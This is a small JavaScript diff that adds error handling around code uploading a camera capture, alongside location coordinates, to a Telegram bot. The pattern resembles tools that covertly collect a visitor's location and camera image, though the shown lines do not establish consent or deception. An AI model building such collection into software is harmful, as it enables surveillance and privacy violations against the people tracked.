@@ -54,16 +54,20 @@ Longitude: ${data.location.longitude}
 
     // Send image if available
     if (data.image) {
-      const formData = new FormData()
-      const blob = await fetch(data.image).then(r => r.blob())
-      formData.append('photo', blob, 'capture.jpg')
-      formData.append('chat_id', chatId)
-      formData.append('caption', '📸 Captura da câmera')
+      try {
+        const formData = new FormData()
+        const blob = await fetch(data.image).then(r => r.blob())
+        formData.append('photo', blob, 'capture.jpg')
+        formData.append('chat_id', chatId)
+        formData.append('caption', '📸 Captura da câmera')
 
-      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      })
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        })
+      } catch (error) {
+        console.error('Error sending image to Telegram:', error)
+      }
     }
   } catch (error) {
     console.error('Error sending to Telegram:', error)
